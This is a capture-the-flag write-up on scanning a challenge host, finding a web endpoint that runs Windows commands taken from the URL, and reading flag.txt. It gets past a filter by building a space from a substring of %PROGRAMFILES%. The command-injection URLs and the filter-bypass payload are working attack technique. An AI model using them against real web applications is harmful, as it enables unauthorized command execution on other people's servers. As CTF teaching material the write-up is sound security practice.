# 01 - Seeing is believing

The challenge description provides a few urls for the challenge. Using any endpoint would yield the same instance. In our case, we pivoted on a few machines as they went down, but for simplicity we will use the following instance:

```
ec2-34-229-202-66.compute-1.amazonaws.com
```

If we try reaching the base port HTTPS or HTTP, the instance hangs. Therefore, we assumed that the instance was hidden on a port. The fastest way to enumerate ports today is to use `rustscan`. You can enumerate as follows:

```
rustscan -a ec2-34-229-202-66.compute-1.amazonaws.com
```

This found the open port `8000`. We can visit the HTTP website:

```
http://ec2-34-229-202-66.compute-1.amazonaws.com:8000/
```

This led to a "generic" website. Like for other challenges in this CTF, the website "corrupts" and redirects to the following url:

```
http://ec2-34-229-202-66.compute-1.amazonaws.com:8000/a1d21888edef025330bfa6c806625a76/call/skynet
```

Given the naming convention, we assumed that `call` would run the exectuable `skynet` on the host. We can attempt typical RCE commands and discover that the following yields the directory structure:

```
http://ec2-34-229-202-66.compute-1.amazonaws.com:8000/a1d21888edef025330bfa6c806625a76/call/dir
```

Yup, it's a Windows machine (our favorite)... We see that it is running a Rust app, which we could've determined from the web requests (using Rocket). We see that there is a `flag.txt` in the root directory. We can try to read the file with url encoding:

```
http://ec2-34-229-202-66.compute-1.amazonaws.com:8000/a1d21888edef025330bfa6c806625a76/call/type%20flag.txt
```

This said, that fails... After a while of testing commands, it seemed that the url content was taken literally but would still prevent special characters. We ended up having to create a space from an environment variable:

```
%PROGRAMFILES:~10,-5%
```

We can use the previous to create a payload dumping the flag:

```
http://ec2-34-229-202-66.compute-1.amazonaws.com:8000/a1d21888edef025330bfa6c806625a76/call/type%PROGRAMFILES:~10,-5%flag.txt
```
